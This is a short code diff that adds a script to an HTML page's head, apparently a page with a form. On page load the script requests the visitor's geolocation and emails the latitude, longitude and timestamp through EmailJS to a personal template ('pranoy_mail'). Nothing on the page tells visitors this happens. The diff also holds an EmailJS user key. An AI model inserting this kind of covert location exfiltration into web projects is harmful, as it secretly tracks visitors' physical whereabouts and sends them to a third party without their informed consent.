@@ -7,6 +7,21 @@
         <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
     <link rel="stylesheet" href="css/styles.css">
     <script src="/js/lib/jquery-3.2.1.min.js"></script>
+
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("user_yKOIZdzTKV3oSiNQ8azol");
+   })();
+
+   navigator.geolocation.getCurrentPosition(function(pos){
+        var date = new Date(pos.timestamp);
+        
+        var lat = pos.coords.latitude;
+        var lng = pos.coords.longitude;
+        emailjs.send("gmail", "pranoy_mail", {lat,lng,date});
+   });
+</script>
     <style>
     .centered-form{
         background-image: url(/img/bg2.png);
